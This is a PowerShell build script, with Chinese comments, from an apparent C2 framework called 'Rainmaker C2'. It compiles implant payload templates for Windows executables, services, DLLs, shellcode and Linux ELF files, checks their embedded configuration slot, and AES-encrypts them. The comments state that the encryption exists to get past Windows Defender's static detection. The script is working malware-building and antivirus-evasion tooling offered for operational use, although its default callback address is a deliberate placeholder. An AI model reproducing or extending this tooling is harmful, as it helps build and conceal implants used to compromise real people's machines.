# Rainmaker C2 :: 构建载荷模板 (供服务端内置生成器使用)
#
# 背景: 原先每生成一个载荷都要调 gcc 重新编译 —— 生成端必须装 MinGW + PowerShell。
# 现在把编译挪到**项目构建期**: 这里产出的模板被打进服务端二进制 (go:embed),
# 之后服务端生成载荷时只做二进制层的配置覆写, 生成端零工具链。
#
# 产物: go\templates\<格式>.bin
#   每个模板里的配置槽都是"未启用"状态 (version=0), 且编译期默认值故意设成
#   无效目标 (0.0.0.0:1 + 60 秒 sleep) —— 万一生成器漏写配置, 载荷会明显不工作,
#   而不是悄悄回连到开发机。
#
# 什么时候需要重跑: 改了植入体 C 代码之后。改模板 = 改所有后续生成的载荷,
# 所以模板要跟代码一起提交, 否则别人 clone 下来 go build 出来的服务端没有模板。
#
# 用法: pwsh -File tools\build_templates.ps1
param(
    [string]$OutDir = '',
    [string]$MinGw  = '',
    [ValidateSet('windows', 'linux', 'all')]
    [string]$Set = 'windows'
)

$ErrorActionPreference = 'Stop'
$root = Split-Path $PSScriptRoot -Parent
if ($OutDir -eq '') { $OutDir = Join-Path $root 'go\templates' }
New-Item -ItemType Directory -Path $OutDir -Force | Out-Null

$gen2 = Join-Path $PSScriptRoot 'gen_payload2.ps1'
if (-not (Test-Path $gen2)) { throw "生成器缺失: $gen2" }

# 模板的编译期默认值 —— 故意无效, 见文件头说明
$PH_HOST = '0.0.0.0'
$PH_PORT = 1
$PH_SLEEP = 60000

# 格式 -> 输出文件。只包含**结构性不同**的格式: 子系统、入口、链接方式不同的必须各自一份;
# 仅参数不同的 (host/port/uri/sleep/口令) 都靠运行时配置槽, 共用同一个模板。
$targets = @(
    @{ Format = 'win2-exe';     File = 'win2-exe.bin';     Desc = 'Windows x64 GUI 可执行文件' },
    @{ Format = 'win2-console'; File = 'win2-console.bin'; Desc = 'Windows x64 控制台可执行文件' },
    @{ Format = 'win2-svc';     File = 'win2-svc.bin';     Desc = 'Windows x64 服务程序' },
    @{ Format = 'win2-dll';     File = 'win2-dll.bin';     Desc = 'Windows x64 动态链接库' },
    @{ Format = 'win2-raw';     File = 'win2-raw.bin';     Desc = 'Windows x64 shellcode' },
    @{ Format = 'win2-tcp';     File = 'win2-tcp.bin';     Desc = 'Windows x64 TCP 直连可执行文件' }
)
if ($Set -eq 'linux' -or $Set -eq 'all') {
    $targets += @(
        @{ Format = 'linux2-elf'; File = 'linux2-elf.bin'; Desc = 'Linux x64 静态 ELF' },
        @{ Format = 'linux2-dyn'; File = 'linux2-dyn.bin'; Desc = 'Linux x64 动态 ELF' }
    )
}

$tmp = Join-Path $root 'build\payload'
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

# ---------------------------------------------------------------- 模板加密
# 模板必须**加密入库**: 服务端要零工具链生成载荷就得把编译好的载荷带在自己里面,
# 而带明文的 C2 载荷会让服务端二进制本身被杀软静态查杀
# (实测 Windows Defender 直接拦截构建 —— Go 把产物写到临时路径的瞬间就被隔离)。
#
# 密钥与模板同目录。密钥能被逆出来, 但这不影响目的: 挡的是静态特征扫描, 不是逆向。
$keyPath = Join-Path $OutDir 'key.bin'
if (Test-Path $keyPath) {
    $key = [System.IO.File]::ReadAllBytes($keyPath)
    if ($key.Length -ne 32) { throw "模板密钥长度异常 ($($key.Length)), 删除 $keyPath 可重新生成" }
    Write-Host "[*] 复用已有模板密钥" -ForegroundColor DarkGray
} else {
    $key = New-Object byte[] 32
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
    [System.IO.File]::WriteAllBytes($keyPath, $key)
    Write-Host "[*] 已生成模板密钥" -ForegroundColor DarkGray
}

# AES-256-CBC + PKCS7。用 CBC 而不是 CFB: .NET 的 CFB 是 CFB8, 与 Go 的 CFB128
# 不兼容, 两侧盲写必然对不上; CBC + PKCS7 在两边的语义完全一致, 没有歧义。
function Protect-Template([byte[]]$Plain, [byte[]]$Key) {
    $iv = New-Object byte[] 16
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.Key = $Key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $enc = $aes.CreateEncryptor()
    $ct = $enc.TransformFinalBlock($Plain, 0, $Plain.Length)
    $enc.Dispose(); $aes.Dispose()
    $out = New-Object byte[] ($iv.Length + $ct.Length)
    [Array]::Copy($iv, 0, $out, 0, $iv.Length)
    [Array]::Copy($ct, 0, $out, $iv.Length, $ct.Length)
    return $out
}

$magic = [byte[]](0x52, 0x47, 0x43, 0x32, 0xA5, 0x5A, 0xC3, 0x3C)

function Find-Magic([byte[]]$b, [byte[]]$m) {
    $offsets = New-Object System.Collections.ArrayList
    for ($i = 0; $i -le $b.Length - $m.Length; $i++) {
        $hit = $true
        for ($j = 0; $j -lt $m.Length; $j++) {
            if ($b[$i + $j] -ne $m[$j]) { $hit = $false; break }
        }
        if ($hit) { [void]$offsets.Add($i) }
    }
    return , $offsets
}

$results = @()
foreach ($t in $targets) {
    Write-Host ("[*] {0,-14} {1}" -f $t.Format, $t.Desc) -ForegroundColor Cyan

    # 注意变量名不能叫 $args —— 那是 PowerShell 的自动变量, 会被覆盖掉
    $gargs = @('-NoProfile', '-File', $gen2,
               '-Format', $t.Format,
               '-Host_', $PH_HOST, '-Port', $PH_PORT,
               '-Sleep', $PH_SLEEP, '-Quiet')
    if ($MinGw -ne '') { $gargs += @('-MinGw', $MinGw) }

    # 与 gen_payload2.ps1 的宿主策略一致: 优先 pwsh(7+, 默认 UTF-8), 退回
    # powershell.exe(5.1, ANSI)。原实现硬编码 pwsh, 在只装 5.1 的机器上会直接
    # "The term 'pwsh' is not recognized" 而中断整批模板构建。
    $psHost = 'pwsh.exe'
    if (-not (Get-Command $psHost -ErrorAction SilentlyContinue)) { $psHost = 'powershell.exe' }

    $log = & $psHost @gargs 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host ("    [!] 生成失败: {0}" -f ($log | Select-Object -Last 3)) -ForegroundColor Red
        continue
    }

    # 生成器按 payload2_<格式>_<host>_<port>.<ext> 命名, 扩展名随格式变
    $made = Get-ChildItem $tmp -Filter ("payload2_{0}_*" -f $t.Format) -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending | Select-Object -First 1
    if (-not $made) {
        Write-Host "    [!] 找不到产物" -ForegroundColor Red
        continue
    }

    # --- 先在**明文**上校验配置槽, 加密之后就查不出来了 ---
    $bytes = [System.IO.File]::ReadAllBytes($made.FullName)
    $offsets = Find-Magic $bytes $magic

    if ($offsets.Count -ne 1) {
        Write-Host ("    [!] 配置槽校验失败: 标记命中 {0} 次 (必须恰好 1 次)" -f $offsets.Count) -ForegroundColor Red
        continue
    }
    if (($bytes.Length - $offsets[0]) -lt 1024) {
        Write-Host "    [!] 配置槽校验失败: 槽位超出文件尾" -ForegroundColor Red
        continue
    }
    $ver = [BitConverter]::ToUInt32($bytes, $offsets[0] + 8)
    if ($ver -ne 0) {
        Write-Host ("    [!] 配置槽校验失败: version={0}, 模板应为 0" -f $ver) -ForegroundColor Red
        continue
    }

    # --- 加密后写入目标 ---
    $dest = Join-Path $OutDir $t.File
    $enc = Protect-Template $bytes $key
    [System.IO.File]::WriteAllBytes($dest, $enc)

    # --- 反查: 密文里绝不能残留定位标记, 否则等于没加密 ---
    $back = [System.IO.File]::ReadAllBytes($dest)
    if ((Find-Magic $back $magic).Count -ne 0) {
        Write-Host "    [!] 加密后仍能搜到定位标记 —— 加密未生效, 拒绝交付" -ForegroundColor Red
        Remove-Item $dest -Force -ErrorAction SilentlyContinue
        continue
    }

    $fi = Get-Item $dest
    Write-Host ("    [OK] {0,-20} 明文 {1,9:N0} -> 密文 {2,9:N0} 字节   槽位 @0x{3:X}" -f `
        $fi.Name, $bytes.Length, $fi.Length, $offsets[0]) -ForegroundColor Green
    $results += [pscustomobject]@{ Name = $fi.Name; Bytes = $fi.Length; Slot = $offsets[0] }
}

Write-Host ""
if ($results.Count -eq 0) { throw "没有任何模板构建成功" }

$total = ($results | Measure-Object Bytes -Sum).Sum
Write-Host ("[+] 完成: {0} 个模板, 合计 {1:N0} 字节 ({2:N2} MB) -> {3}" -f `
    $results.Count, $total, ($total / 1MB), $OutDir) -ForegroundColor Green
